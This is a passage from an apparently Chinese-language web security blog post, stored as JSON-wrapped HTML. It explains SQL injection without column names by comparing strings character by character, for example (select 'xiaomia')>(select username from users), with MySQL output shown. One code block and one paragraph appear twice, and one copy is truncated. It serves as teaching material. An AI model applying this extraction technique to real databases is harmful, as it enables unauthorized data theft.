class=\"line\">| (select &#x27;xj&#x27;)&gt;(select username from users) |</span><br><span class=\"line\">+--------------------------------------------+</span><br><span class=\"line\">|                                          1 |</span><br><span class=\"line\">+--------------------------------------------+</span><br><span class=\"line\">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>\n<p>​\t后续的查询操作也就很明显了，当然，这里如果合适的话其实可以利用 python 写个爬虫来进行查询的：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select (select &#x27;xiaomia&#x27;)&gt;(select username from users);</span><br><span class=\"line\">+-------------------------------------------------+</span><br><span class=\"line\">| (select &#x27;xiaomia&#x27;)&gt;(select username from users) |</span><br><span class=\"line\">+-------------------------------------------------+</span><br><span class=\"line\">|                                               1 |</span><br><span class=\"line\">+-------------------------------------------------+</span><br><span class=\"line\">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>\n<p>​\t当然，如果查询到最后一个，在这里也就是 xiaomi 的第二个 i 的之后，如果再对后面进行对比的时候无论如何也是 1，<strong>这里我做一个猜测，应该是因为字符串的结尾是以 \\x00 结尾，因此，每一个可显示字符都要比这个字符大。</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ect &#x27;xiaomia&#x27;)&gt;(select username from users);</span><br><span class=\"line\">+-------------------------------------------------+</span><br><span class=\"line\">| (select &#x27;xiaomia&#x27;)&gt;(select username from users) |</span><br><span class=\"line\">+-------------------------------------------------+</span><br><span class=\"line\">|                                               1 |</span><br><span class=\"line\">+-------------------------------------------------+</span><br><span class=\"line\">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>\n<p>​\t当然，如果查询到最后一个，在这里也就是 xiaomi 的第二个 i 的之后，如果再对后面进行对比的时候无论如何也是 1，<strong>这里我做一个猜测，应该是因为字符串的结尾是以 \\x00 结尾，因此，每一个可显示字符都要比这个字符大。</strong></p>\n<p>​\t好了，ascii 位偏移的无列名注入也说完了！！！ <strong>(p≧w≦q)</strong></p>\n",
            "tags": [
                "Web"
            ]
        }
    ]
}